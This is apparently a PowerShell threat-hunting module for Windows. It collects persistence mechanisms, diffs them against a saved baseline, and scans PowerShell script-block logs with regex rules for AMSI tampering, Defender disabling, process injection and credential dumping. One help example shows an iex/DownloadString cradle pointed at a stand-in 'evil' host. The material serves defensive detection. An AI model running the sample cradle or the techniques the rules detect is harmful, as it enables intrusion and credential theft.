#Requires -Version 5.1
<#
.SYNOPSIS
    HuntKit - Threat Hunting toolkit para Windows.
.DESCRIPTION
    Colectores de persistencia (RunKey/Tarea/Servicio/WMI/Startup), motor de
    baseline+diff basado en SHA-256, analisis de Script Block Logging (EID 4104)
    con reensamblado de bloques fragmentados, reglas compuestas y reporte HTML
    seguro (HtmlEncode en todos los valores).
.NOTES
    Autor   : Damian Fabricio Macancela Caguana
    Version : 0.2.0
    Licencia: MIT
    ATT&CK  : T1547.001, T1053.005, T1543.003, T1546.003, T1059.001,
               T1027, T1105, T1562.001, T1620, T1055, T1003.001
#>

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'

# ── Tabla de severidad (texto → numero para comparar) ────────────────────────
$script:SeverityRank = @{ Low = 1; Medium = 2; High = 3; Critical = 4 }

# ── Reglas de Script-Block (EID 4104) ─────────────────────────────────────────
$script:ScriptBlockRules = @(
    @{
        Id       = 'SB001'
        Name     = 'Base64 decode'
        Severity = 'Medium'
        Mitre    = 'T1027'
        Pattern  = 'FromBase64String'
    },
    @{
        Id       = 'SB002'
        Name     = 'Encoded command flag'
        Severity = 'High'
        Mitre    = 'T1059.001'
        Pattern  = '\s-e(nc|ncodedcommand)?\s+[A-Za-z0-9+/=]{20,}'
    },
    @{
        Id       = 'SB003'
        Name     = 'Invoke-Expression / IEX'
        Severity = 'Medium'
        Mitre    = 'T1059.001'
        Pattern  = '\b(Invoke-Expression|iex)\b'
    },
    @{
        Id       = 'SB004'
        Name     = 'Download cradle'
        Severity = 'Low'
        Mitre    = 'T1105'
        Pattern  = 'Net\.WebClient|DownloadString|DownloadFile|Invoke-WebRequest|Invoke-RestMethod|Start-BitsTransfer|\biwr\b'
    },
    @{
        Id       = 'SB005'
        Name     = 'AMSI tampering'
        Severity = 'High'
        Mitre    = 'T1562.001'
        Pattern  = 'AmsiUtils|amsiInitFailed|AmsiScanBuffer'
    },
    @{
        Id       = 'SB006'
        Name     = 'Defender exclusion/disable'
        Severity = 'High'
        Mitre    = 'T1562.001'
        Pattern  = '(Set|Add)-MpPreference\s+.*-(Disable\w+|Exclusion\w+)'
    },
    @{
        Id       = 'SB007'
        Name     = 'Reflective assembly load'
        Severity = 'High'
        Mitre    = 'T1620'
        Pattern  = '\[Reflection\.Assembly\]?::Load'
    },
    @{
        Id       = 'SB008'
        Name     = 'Win32 memory API'
        Severity = 'High'
        Mitre    = 'T1055'
        Pattern  = 'VirtualAlloc|WriteProcessMemory|CreateRemoteThread|VirtualProtect'
    },
    @{
        Id       = 'SB009'
        Name     = 'Credential dumping'
        Severity = 'Critical'
        Mitre    = 'T1003.001'
        Pattern  = 'sekurlsa|Invoke-Mimikatz|MiniDump|comsvcs\.dll'
    },
    @{
        Id       = 'SB010'
        Name     = 'Hidden window / bypass flags'
        Severity = 'Low'
        Mitre    = 'T1059.001'
        Pattern  = '-w(indowstyle)?\s+hidden|ExecutionPolicy\s+Bypass|-ep\s+bypass'
    },
    @{
        Id       = 'SB011'
        Name     = 'Char-code obfuscation'
        Severity = 'Medium'
        Mitre    = 'T1027'
        Pattern  = '(\[char\]\s*\d+.{0,10}){3,}'
    }
)

#region ── Helpers privados ────────────────────────────────────────────────────

function Test-IsAdmin {
    $id = [Security.Principal.WindowsIdentity]::GetCurrent()
    ([Security.Principal.WindowsPrincipal]$id).IsInRole(
        [Security.Principal.WindowsBuiltInRole]::Administrator
    )
}

function Get-HuntId {
    <#
    .SYNOPSIS Hash SHA-256 truncado a 16 hex. Clave estable para el diff. #>
    [OutputType([string])]
    param([Parameter(Mandatory)][string]$InputString)

    $sha = [System.Security.Cryptography.SHA256]::Create()
    try {
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($InputString)
        ([BitConverter]::ToString($sha.ComputeHash($bytes)) -replace '-','').Substring(0, 16)
    }
    finally { $sha.Dispose() }
}

function ConvertTo-PersistenceItem {
    <#
    .SYNOPSIS Fabrica un item de persistencia con Id estable. #>
    param(
        [string]$Type,
        [string]$Location,
        [string]$Name,
        [string]$Command,
        [string]$Mitre,
        [string]$Extra = ''
    )
    [pscustomobject][ordered]@{
        Id       = Get-HuntId "$Type|$Location|$Name|$Command"
        Type     = $Type
        Location = $Location
        Name     = $Name
        Command  = $Command
        Mitre    = $Mitre
        Extra    = $Extra
    }
}

#endregion

#region ── Colectores de persistencia ─────────────────────────────────────────

function Get-RunKeyPersistence {
    [OutputType([pscustomobject[]])]
    param()

    # Propiedades de metadatos que PowerShell agrega al objeto de registro
    $meta = @('PSPath','PSParentPath','PSChildName','PSDrive','PSProvider')

    $paths = @(
        'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
        'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce',
        'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
        'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce',
        'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run'
    )

    foreach ($p in $paths) {
        if (-not (Test-Path -LiteralPath $p)) { continue }
        try {
            $key = Get-ItemProperty -LiteralPath $p -ErrorAction SilentlyContinue
            if ($null -eq $key) { continue }

            foreach ($prop in $key.PSObject.Properties) {
                if ($meta -contains $prop.Name) { continue }
                ConvertTo-PersistenceItem `
                    -Type     'RunKey' `
                    -Location $p `
                    -Name     $prop.Name `
                    -Command  ([string]$prop.Value) `
                    -Mitre    'T1547.001'
            }
        }
        catch { Write-Warning "RunKey [$p]: $_" }
    }
}

function Get-ScheduledTaskPersistence {
    [OutputType([pscustomobject[]])]
    param([switch]$IncludeMicrosoft)

    try {
        $tasks = Get-ScheduledTask -ErrorAction SilentlyContinue
        foreach ($t in $tasks) {
            if (-not $IncludeMicrosoft -and $t.TaskPath -like '\Microsoft\Windows\*') { continue }

            foreach ($a in $t.Actions) {
                # Las acciones COM no tienen 'Execute'; acceder por PSObject evita errores
                $exec = $a.PSObject.Properties['Execute']
                $args = $a.PSObject.Properties['Arguments']
                $cmd  = (($exec?.Value) + ' ' + ($args?.Value)).Trim()

                ConvertTo-PersistenceItem `
                    -Type     'ScheduledTask' `
                    -Location "$($t.TaskPath)$($t.TaskName)" `
                    -Name     $t.TaskName `
                    -Command  $cmd `
                    -Mitre    'T1053.005'
            }
        }
    }
    catch { Write-Warning "ScheduledTask: $_" }
}

function Get-ServicePersistence {
    [OutputType([pscustomobject[]])]
    param([switch]$IncludeMicrosoft)

    try {
        $svcs = Get-CimInstance -ClassName Win32_Service -ErrorAction SilentlyContinue
        foreach ($s in $svcs) {
            if (-not $s.PathName) { continue }
            if (-not $IncludeMicrosoft -and $s.PathName -match '^"?C:\\Windows\\') { continue }

            ConvertTo-PersistenceItem `
                -Type     'Service' `
                -Location 'HKLM:\SYSTEM\CurrentControlSet\Services' `
                -Name     $s.Name `
                -Command  $s.PathName `
                -Mitre    'T1543.003' `
                -Extra    "State=$($s.State)"
        }
    }
    catch { Write-Warning "Service: $_" }
}

function Get-WmiPersistence {
    [OutputType([pscustomobject[]])]
    param()

    $consumerClasses = @('CommandLineEventConsumer','ActiveScriptEventConsumer')

    foreach ($class in $consumerClasses) {
        try {
            $consumers = Get-CimInstance -Namespace 'root\subscription' `
                            -ClassName $class -ErrorAction SilentlyContinue
            foreach ($c in $consumers) {
                $cmd = switch ($class) {
                    'CommandLineEventConsumer'  { $c.CommandLineTemplate }
                    'ActiveScriptEventConsumer' { $c.ScriptText }
                }
                ConvertTo-PersistenceItem `
                    -Type     'WMISubscription' `
                    -Location "root\subscription\$class" `
                    -Name     $c.Name `
                    -Command  ([string]$cmd) `
                    -Mitre    'T1546.003'
            }
        }
        catch { Write-Warning "WMI [$class]: $_" }
    }
}

function Get-StartupFolderPersistence {
    [OutputType([pscustomobject[]])]
    param()

    $folders = @(
        [System.Environment]::GetFolderPath('Startup'),
        [System.Environment]::GetFolderPath('CommonStartup')
    )

    foreach ($folder in $folders) {
        if (-not (Test-Path -LiteralPath $folder)) { continue }
        try {
            Get-ChildItem -LiteralPath $folder -File -ErrorAction SilentlyContinue |
                Where-Object { $_.Name -ne 'desktop.ini' } |
                ForEach-Object {
                    $hash = (Get-FileHash -LiteralPath $_.FullName -Algorithm SHA256 -ErrorAction SilentlyContinue).Hash
                    ConvertTo-PersistenceItem `
                        -Type     'StartupFolder' `
                        -Location $folder `
                        -Name     $_.Name `
                        -Command  $_.FullName `
                        -Mitre    'T1547.001' `
                        -Extra    "SHA256=$hash"
                }
        }
        catch { Write-Warning "StartupFolder [$folder]: $_" }
    }
}

#endregion

#region ── Snapshot, baseline y diff ──────────────────────────────────────────

function Get-PersistenceSnapshot {
<#
.SYNOPSIS
    Recolecta todos los mecanismos de persistencia conocidos y devuelve la lista.
.DESCRIPTION
    Agrega RunKeys, Tareas Programadas, Servicios, Subscripciones WMI y archivos
    en carpetas Startup. Sin admin, los colectores de servicios y WMI pueden estar
    incompletos (se emite un Warning).
.PARAMETER IncludeMicrosoft
    Incluye tareas y servicios de Microsoft/Windows (alta cantidad, util para
    auditorias completas).
.EXAMPLE
    Get-PersistenceSnapshot | Group-Object Type | Select Name, Count
.NOTES
    ATT&CK: T1547.001, T1053.005, T1543.003, T1546.003
#>
    [CmdletBinding()]
    [OutputType([pscustomobject[]])]
    param([switch]$IncludeMicrosoft)

    if (-not (Test-IsAdmin)) {
        Write-Warning 'Sin privilegios de administrador: servicios y WMI pueden estar incompletos.'
    }

    $items = @(
        Get-RunKeyPersistence
        Get-ScheduledTaskPersistence -IncludeMicrosoft:$IncludeMicrosoft
        Get-ServicePersistence       -IncludeMicrosoft:$IncludeMicrosoft
        Get-WmiPersistence
        Get-StartupFolderPersistence
    )

    $items | Sort-Object Type, Location, Name
}

function Save-PersistenceBaseline {
<#
.SYNOPSIS
    Guarda un snapshot de persistencia como JSON firmado con SHA-256.
.DESCRIPTION
    Serializa el snapshot actual a JSON. El campo IntegrityHash permite
    detectar si el archivo fue modificado fuera de HuntKit.
    IMPORTANTE: guarda el baseline fuera del host analizado (share de solo
    lectura, SIEM) o un atacante con acceso local podria alterarlo.
.PARAMETER Path
    Ruta de salida del archivo JSON (requerida).
.PARAMETER IncludeMicrosoft
    Propaga a Get-PersistenceSnapshot para incluir artefactos de Microsoft.
.EXAMPLE
    Save-PersistenceBaseline -Path .\baseline.json
.NOTES
    ATT&CK cubierto: T1547.001, T1053.005, T1543.003, T1546.003
#>
    [CmdletBinding(SupportsShouldProcess)]
    param(
        [Parameter(Mandatory)]
        [string]$Path,

        [switch]$IncludeMicrosoft
    )

    if (-not $PSCmdlet.ShouldProcess($Path, 'Guardar baseline de persistencia')) { return }

    $snap = @(Get-PersistenceSnapshot -IncludeMicrosoft:$IncludeMicrosoft)

    # Serializar primero sin hash para calcular hash del contenido
    $json = ConvertTo-Json -InputObject $snap -Depth 4

    $integrityHash = Get-HuntId $json  # hash del contenido puro

    $wrapper = [ordered]@{
        Version       = '2.0'
        CapturedAt    = (Get-Date -Format 'o')
        ComputerName  = $env:COMPUTERNAME
        ItemCount     = $snap.Count
        IntegrityHash = $integrityHash
        Items         = $snap
    }

    $finalJson = ConvertTo-Json -InputObject $wrapper -Depth 5
    [System.IO.File]::WriteAllText(
        [System.IO.Path]::GetFullPath($Path),
        $finalJson,
        [System.Text.Encoding]::UTF8
    )

    Write-Host "[+] Baseline guardado: $Path  ($($snap.Count) items)" -ForegroundColor Green
}

function Compare-PersistenceSnapshot {
<#
.SYNOPSIS
    Compara dos snapshots y devuelve las diferencias (Added / Removed).
.DESCRIPTION
    Funcion pura: no accede al sistema. Util para tests unitarios y para
    reutilizar con snapshots precargados.
    El diff se basa en el Id (hash de Type|Location|Name|Command).
    Si un comando cambia, el item aparece como Removed + Added.
.PARAMETER Baseline
    Array de items del baseline (de Get-PersistenceSnapshot o ConvertFrom-Json).
.PARAMETER Current
    Array de items del estado actual.
.EXAMPLE
    $base = Get-Content baseline.json | ConvertFrom-Json | Select-Object -Exp Items
    $curr = Get-PersistenceSnapshot
    Compare-PersistenceSnapshot -Baseline $base -Current $curr
#>
    [CmdletBinding()]
    [OutputType([pscustomobject[]])]
    param(
        [Parameter(Mandatory)]
        [AllowEmptyCollection()]
        [object[]]$Baseline,

        [Parameter(Mandatory)]
        [AllowEmptyCollection()]
        [object[]]$Current
    )

    # Indexar por Id: busqueda O(1)
    $baseIndex = @{}
    foreach ($i in $Baseline) { $baseIndex[$i.Id] = $i }

    $currIndex = @{}
    foreach ($i in $Current)  { $currIndex[$i.Id]  = $i }

    $result = [System.Collections.Generic.List[pscustomobject]]::new()

    # Added: en current pero no en baseline
    foreach ($i in $Current) {
        if (-not $baseIndex.ContainsKey($i.Id)) {
            $result.Add(($i | Select-Object @{n='Change';e={'Added'}}, *))
        }
    }

    # Removed: en baseline pero no en current
    foreach ($i in $Baseline) {
        if (-not $currIndex.ContainsKey($i.Id)) {
            $result.Add(($i | Select-Object @{n='Change';e={'Removed'}}, *))
        }
    }

    $result.ToArray()
}

function Get-PersistenceDrift {
<#
.SYNOPSIS
    Compara el estado actual de persistencia con un baseline guardado en disco.
.DESCRIPTION
    Wrapper de Compare-PersistenceSnapshot que carga el JSON y toma un snapshot
    fresco. Usa el mismo flag -IncludeMicrosoft que usaste al guardar el baseline,
    o el diff mostrara falsos positivos Added de artefactos de Microsoft.
.PARAMETER BaselinePath
    Ruta al archivo JSON generado por Save-PersistenceBaseline.
.PARAMETER IncludeMicrosoft
    Debe coincidir con el flag usado al guardar el baseline.
.PARAMETER OutputPath
    Si se especifica, exporta un reporte HTML.
.EXAMPLE
    Get-PersistenceDrift -BaselinePath .\baseline.json
.EXAMPLE
    Get-PersistenceDrift -BaselinePath .\baseline.json -OutputPath .\report.html
#>
    [CmdletBinding()]
    [OutputType([pscustomobject[]])]
    param(
        [Parameter(Mandatory)]
        [ValidateScript({ Test-Path -LiteralPath $_ })]
        [string]$BaselinePath,

        [switch]$IncludeMicrosoft,

        [string]$OutputPath
    )

    $raw     = Get-Content -LiteralPath $BaselinePath -Raw -Encoding UTF8
    $wrapper = $raw | ConvertFrom-Json

    # Soporte baseline v1.0 (array directo) y v2.0 (wrapper con Items)
    $baseItems = if ($wrapper.PSObject.Properties['Items']) {
        @($wrapper.Items)
    } else {
        @($wrapper)
    }

    Write-Verbose "Baseline: $($wrapper.CapturedAt) en $($wrapper.ComputerName)"

    $curr  = @(Get-PersistenceSnapshot -IncludeMicrosoft:$IncludeMicrosoft)
    $drift = @(Compare-PersistenceSnapshot -Baseline $baseItems -Current $curr)

    if ($drift.Count -eq 0) {
        Write-Host '[OK] Sin cambios en mecanismos de persistencia.' -ForegroundColor Green
    }
    else {
        foreach ($d in $drift) {
            $color = if ($d.Change -eq 'Added') { 'Red' } else { 'Yellow' }
            Write-Host "[$($d.Change)] $($d.Type) | $($d.Mitre) | $($d.Name)" -ForegroundColor $color
            Write-Host "    Location: $($d.Location)"
            Write-Host "    Command : $($d.Command)"
            Write-Host ''
        }
    }

    if ($OutputPath) {
        Export-HuntReport -Findings $drift -OutputPath $OutputPath -Title 'Persistence Drift Report'
    }

    $drift
}

#endregion

#region ── Motor de reglas Script-Block ───────────────────────────────────────

function Test-ScriptBlockText {
<#
.SYNOPSIS
    Aplica las reglas de deteccion sobre un texto de script block.
.DESCRIPTION
    Funcion pura: acepta texto, devuelve hallazgos. No accede al sistema.
    Incluye la regla compuesta SB100 (Download + IEX = cradle).
    Todos los matches se truncan a 120 caracteres para no volcar payloads.
.PARAMETER Text
    Texto del script block a analizar. Acepta pipeline.
.EXAMPLE
    'iex((New-Object Net.WebClient).DownloadString("http://evil"))' | Test-ScriptBlockText
#>
    [CmdletBinding()]
    [OutputType([pscustomobject[]])]
    param(
        [Parameter(Mandatory, ValueFromPipeline)]
        [AllowEmptyString()]
        [string]$Text
    )

    process {
        # @(foreach ...) garantiza array aunque no haya hits ($null.Count seria 1 sin @())
        $hits = @(foreach ($r in $script:ScriptBlockRules) {
            if ($Text -match $r.Pattern) {
                $m = $Matches[0]
                if ($m.Length -gt 120) { $m = $m.Substring(0, 120) }
                [pscustomobject]@{
                    RuleId   = $r.Id
                    Name     = $r.Name
                    Severity = $r.Severity
                    Mitre    = $r.Mitre
                    Match    = $m
                }
            }
        })

        # Regla compuesta SB100: Download + IEX = cradle clasico (High)
        $hitIds = @($hits | ForEach-Object { $_.RuleId })
        if (($hitIds -contains 'SB003') -and ($hitIds -contains 'SB004')) {
            $hits += [pscustomobject]@{
                RuleId   = 'SB100'
                Name     = 'Download cradle + ejecucion directa'
                Severity = 'High'
                Mitre    = 'T1059.001,T1105'
                Match    = 'IEX + download (correlacion)'
            }
        }

        $hits
    }
}

function Find-SuspiciousScriptBlock {
<#
.SYNOPSIS
    Analiza eventos EID 4104 en busca de tecnicas ofensivas conocidas.
.DESCRIPTION
    - Reansamblado de bloques fragmentados: PowerShell parte scripts grandes en
      multiples eventos 4104. Se agrupa por ScriptBlockId y se concatena por
      MessageNumber antes de aplicar reglas. Sin esto, un payload partido evade
      regex de strings cortos.
    - Autoexclusion por ruta: los propios patrones del modulo quedarian
      registrados en 4104 y se auto-detectarian.
    - Severidad del evento = maxima entre las reglas que coinciden.
    - Soporta analisis offline con -EvtxPath (evidencia, demos, tests).

    LIMITACIONES:
    - Un atacante con permisos de admin puede desactivar Script Block Logging.
    - Ofuscacion fuera de los patrones (concatenacion, reflection avanzada) evade.
    - Un script desde una carpeta llamada 'HuntKit' evade la autoexclusion.
      Mejora: excluir por hash del modulo o ruta firmada.
.PARAMETER Since
    Analizar eventos desde esta fecha/hora (default: ultimas 24 horas).
.PARAMETER ComputerName
    Equipo a consultar via WinRM (default: local).
.PARAMETER EvtxPath
    Ruta a archivo .evtx para analisis offline.
.PARAMETER MinSeverity
    Severidad minima a reportar: Low | Medium | High | Critical (default: Medium).
.PARAMETER ExcludePathPattern
    Patron wildcard para excluir scripts por ruta. Default excluye el propio modulo.
.PARAMETER OutputPath
    Si se especifica, exporta un reporte HTML.
.EXAMPLE
    Find-SuspiciousScriptBlock -Since (Get-Date).AddHours(-6) -MinSeverity High
.EXAMPLE
    Find-SuspiciousScriptBlock -EvtxPath .\tests\data\sample.evtx -Since (Get-Date).AddYears(-5)
#>
    [CmdletBinding(DefaultParameterSetName = 'Live')]
    [OutputType([pscustomobject[]])]
    param(
        [Parameter()]
        [datetime]$Since = (Get-Date).AddHours(-24),

        [Parameter(ParameterSetName = 'Live')]
        [string]$ComputerName = $env:COMPUTERNAME,

        [Parameter(ParameterSetName = 'Offline', Mandatory)]
        [ValidateScript({ Test-Path -LiteralPath $_ })]
        [string]$EvtxPath,

        [Parameter()]
        [ValidateSet('Low','Medium','High','Critical')]
        [string]$MinSeverity = 'Medium',

        [Parameter()]
        [string]$ExcludePathPattern = '*HuntKit*',

        [Parameter()]
        [string]$OutputPath
    )

    $minRank = $script:SeverityRank[$MinSeverity]

    # Obtener eventos
    $filter = if ($PSCmdlet.ParameterSetName -eq 'Offline') {
        @{ Path = $EvtxPath; Id = 4104; StartTime = $Since }
    }
    else {
        @{ LogName = 'Microsoft-Windows-PowerShell/Operational'; Id = 4104; StartTime = $Since }
    }

    $getParams = @{ FilterHashtable = $filter; ErrorAction = 'Stop' }
    if ($PSCmdlet.ParameterSetName -eq 'Live' -and $ComputerName -ne $env:COMPUTERNAME) {
        $getParams['ComputerName'] = $ComputerName
    }

    try {
        $events = @(Get-WinEvent @getParams)
    }
    catch {
        if ($_.FullyQualifiedErrorId -like '*NoMatchingEventsFound*') {
            Write-Warning 'Sin eventos 4104. Verifica que Script Block Logging este habilitado.'
            return @()
        }
        throw
    }

    if ($events.Count -eq 0) {
        Write-Warning 'Sin eventos 4104 en el rango especificado.'
        return @()
    }

    $findings = [System.Collections.Generic.List[pscustomobject]]::new()

    # EID 4104 Properties (verificado en Windows 10/11 PowerShell 5.1 y 7):
    # [0] = MessageNumber (int)
    # [1] = MessageTotal  (int)
    # [2] = ScriptBlockText (string)
    # [3] = ScriptBlockId (GUID)
    # [4] = Path (string, puede ser vacio para bloques interactivos)

    # Reagrupar por ScriptBlockId para reensamblar bloques fragmentados
    $grouped = $events | Group-Object { [string]$_.Properties[3].Value }

    foreach ($g in $grouped) {
        # Ordenar por MessageNumber, deduplicar si hay eventos duplicados
        $parts = $g.Group |
            Group-Object { [int]$_.Properties[0].Value } |
            Sort-Object   { [int]$_.Name } |
            ForEach-Object { $_.Group[0] }   # primer evento de cada numero

        # Concatenar fragmentos para obtener el texto completo
        $text = (@($parts | ForEach-Object { [string]$_.Properties[2].Value })) -join ''
        $path = [string]$parts[0].Properties[4].Value

        # Autoexclusion por ruta del modulo
        if ($path -and $ExcludePathPattern -and $path -like $ExcludePathPattern) { continue }

        # Aplicar reglas
        $hits = @($text | Test-ScriptBlockText)
        if ($hits.Count -eq 0) { continue }

        # Calcular severidad maxima del evento
        $maxRank = ($hits | ForEach-Object { $script:SeverityRank[$_.Severity] } |
                    Measure-Object -Maximum).Maximum

        # Filtrar por MinSeverity
        if ($maxRank -lt $minRank) { continue }

        # Severidad del evento = la maxima
        $eventSeverity = ($script:SeverityRank.GetEnumerator() |
                          Where-Object { $_.Value -eq $maxRank } |
                          Select-Object -First 1).Key

        $snippet = $text.Substring(0, [Math]::Min(200, $text.Length)) -replace '\r?\n',' '

        $findings.Add([pscustomobject][ordered]@{
            TimeCreated   = $parts[0].TimeCreated
            Severity      = $eventSeverity
            ScriptBlockId = $g.Name
            Path          = $path
            Rules         = ($hits.RuleId -join ',')
            Mitre         = (($hits.Mitre | Select-Object -Unique) -join ',')
            Matches       = (($hits.Match | Select-Object -Unique) -join ' | ')
            Snippet       = $snippet
            FragmentCount = $parts.Count
        })
    }

    $results = @($findings | Sort-Object { $script:SeverityRank[$_.Severity] } -Descending)

    if ($results.Count -eq 0) {
        Write-Host "[OK] Sin script blocks sospechosos (>= $MinSeverity) en el periodo analizado." -ForegroundColor Green
    }
    else {
        foreach ($r in $results) {
            $color = switch ($r.Severity) {
                'Critical' { 'Red'     }
                'High'     { 'Magenta' }
                'Medium'   { 'Yellow'  }
                default    { 'Cyan'    }
            }
            Write-Host "[$($r.Severity)] $($r.Rules) | $($r.Mitre)" -ForegroundColor $color
            Write-Host "    Time    : $($r.TimeCreated)"
            Write-Host "    Path    : $($r.Path)"
            Write-Host "    Snippet : $($r.Snippet)"
            Write-Host ''
        }
    }

    if ($OutputPath) {
        Export-HuntReport -Findings $results -OutputPath $OutputPath -Title 'Script-Block Hunt Report'
    }

    $results
}

#endregion

#region ── Reporte HTML (seguro) ───────────────────────────────────────────────

function Export-HuntReport {
<#
.SYNOPSIS
    Exporta hallazgos a un reporte HTML con HtmlEncode en todos los valores.
.DESCRIPTION
    SEGURIDAD: todos los valores se codifican con HtmlEncode antes de insertar
    en el HTML. El texto de un ScriptBlock es input hostil: sin codificacion,
    un payload con <script> se ejecutaria al abrir el reporte (XSS).
    Usa StringBuilder en lugar de concatenacion de strings para rendimiento
    con miles de filas.
.PARAMETER Findings
    Array de objetos pscustomobject a mostrar.
.PARAMETER OutputPath
    Ruta del archivo HTML de salida.
.PARAMETER Title
    Titulo del reporte (default: 'HuntKit Report').
.EXAMPLE
    Get-PersistenceDrift -BaselinePath .\baseline.json -OutputPath .\drift.html
#>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [AllowEmptyCollection()]
        [object[]]$Findings,

        [Parameter(Mandatory)]
        [string]$OutputPath,

        [string]$Title = 'HuntKit Report'
    )

    # Helper de codificacion: captura las variables del scope externo via closure
    $enc = { param($v) [System.Net.WebUtility]::HtmlEncode([string]$v) }

    $generated = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
    $count      = @($Findings).Count

    $sb = [System.Text.StringBuilder]::new()

    [void]$sb.Append(@"
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>$( & $enc $Title )</title>
  <style>
    *    { box-sizing:border-box }
    body { font-family:'Segoe UI',sans-serif; background:#f7fafc; color:#2d3748; margin:0; padding:24px }
    h1   { font-size:20px; border-bottom:2px solid #e2e8f0; padding-bottom:8px; color:#1a202c }
    .meta{ font-size:12px; color:#718096; margin-bottom:20px }
    table{ border-collapse:collapse; width:100%; background:#fff; border-radius:6px;
           box-shadow:0 1px 3px rgba(0,0,0,.1); font-size:12px }
    th   { background:#2d3748; color:#fff; padding:8px 12px; text-align:left }
    td   { padding:7px 12px; border-bottom:1px solid #e2e8f0; vertical-align:top; word-break:break-word; max-width:300px }
    tr:last-child td { border-bottom:none }
    .added   { background:#fff5f5 }
    .removed { background:#fffff0 }
    .badge   { display:inline-block; padding:1px 7px; border-radius:3px; color:#fff; font-size:11px; font-weight:600 }
    .Added   { background:#e53e3e }
    .Removed { background:#d69e2e }
    .Critical{ background:#9b2335 }
    .High    { background:#c05621 }
    .Medium  { background:#d69e2e }
    .Low     { background:#4a90d9 }
    .empty   { text-align:center; padding:40px; color:#48bb78 }
    footer   { font-size:11px; color:#a0aec0; margin-top:12px; text-align:right }
  </style>
</head>
<body>
  <h1>$( & $enc $Title )</h1>
  <div class="meta">Generado: $generated | Host: $( & $enc $env:COMPUTERNAME ) | Hallazgos: $count</div>
"@)

    if ($count -eq 0) {
        [void]$sb.Append('<div class="empty">Sin hallazgos en este reporte.</div>')
    }
    else {
        # Determinar columnas a partir del primer objeto
        $cols = @($Findings[0].PSObject.Properties.Name)

        [void]$sb.Append('<table><thead><tr>')
        foreach ($c in $cols) {
            [void]$sb.Append("<th>$( & $enc $c )</th>")
        }
        [void]$sb.Append('</tr></thead><tbody>')

        foreach ($row in $Findings) {
            # Clase de fila para color de fondo (Change o Severity)
            $rowClass = ''
            if ($row.PSObject.Properties['Change'])   { $rowClass = $row.Change }
            elseif ($row.PSObject.Properties['Severity']) { $rowClass = $row.Severity }

            [void]$sb.Append("<tr class='$rowClass'>")
            foreach ($c in $cols) {
                $val = & $enc $row.$c
                # Badge para columnas Change y Severity
                if ($c -in @('Change','Severity')) {
                    [void]$sb.Append("<td><span class='badge $( & $enc $row.$c )'>$val</span></td>")
                }
                else {
                    [void]$sb.Append("<td>$val</td>")
                }
            }
            [void]$sb.Append('</tr>')
        }

        [void]$sb.Append('</tbody></table>')
    }

    [void]$sb.Append(@"

  <footer>HuntKit v0.2.0 - Damian Fabricio Macancela Caguana - MIT License</footer>
</body>
</html>
"@)

    [System.IO.File]::WriteAllText(
        [System.IO.Path]::GetFullPath($OutputPath),
        $sb.ToString(),
        [System.Text.Encoding]::UTF8
    )

    Write-Host "[+] Reporte HTML: $OutputPath" -ForegroundColor Green
}

#endregion

# Superficie publica minima: los colectores y helpers quedan privados
Export-ModuleMember -Function @(
    'Get-PersistenceSnapshot',
    'Save-PersistenceBaseline',
    'Get-PersistenceDrift',
    'Compare-PersistenceSnapshot',
    'Test-ScriptBlockText',
    'Find-SuspiciousScriptBlock',
    'Export-HuntReport'
)
